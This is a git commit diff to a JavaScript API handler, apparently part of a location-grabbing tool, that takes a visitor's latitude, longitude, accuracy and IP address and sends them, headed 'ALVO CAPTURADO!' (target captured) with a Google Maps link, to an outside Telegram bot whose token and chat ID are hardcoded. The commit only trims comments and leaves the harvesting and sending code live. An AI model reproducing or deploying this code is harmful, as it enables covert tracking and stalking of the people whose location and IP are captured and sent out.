1dd0d8bb4a6b83afb3044bd3245347a7069972ce
RiccK <93783406+rikedev@users.noreply.github.com>
2026-08-25 20:54:35 -0300

    Update salvar.js

--- api/salvar.js
+++ api/salvar.js
@@ -3,20 +3,15 @@ export default async function handler(req, res) {
         try {
             const { lat, lon, precisao } = req.body;
             
-            // Pega o IP do cliente
             const ipCliente = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Desconhecido';
 
-            // Monta a mensagem formatada com um link direto para o Google Maps
             const mensagem = `🚨 ALVO CAPTURADO!\n\n🌐 IP: ${ipCliente}\n📍 Latitude: ${lat}\n📍 Longitude: ${lon}\n🎯 Precisão: ${precisao}m\n\n🗺️ Abrir no Maps: https://www.google.com/maps?q=${lat},${lon}`;
 
             // SEUS DADOS DO TELEGRAM AQUI:
             const tokenBot = "8772002391:AAHnAQNqA6rwWNC79NXdn8m4e_uOPxyjuLk";
             const chatId = "8568978632";
 
-            // Envia a mensagem direto para o seu Telegram
-            const urlTelegram = `https://api.telegram.org/bot${tokenBot}/sendMessage?chat_id=${chatId}&text=` + encodeURIComponent(mensagem);
-            
-            await fetch(urlTelegram);
+            await fetch(`https://api.telegram.org/bot${tokenBot}/sendMessage?chat_id=${chatId}&text=` + encodeURIComponent(mensagem));
 
             return res.status(200).json({ status: 'Sucesso' });
         } catch (err) {
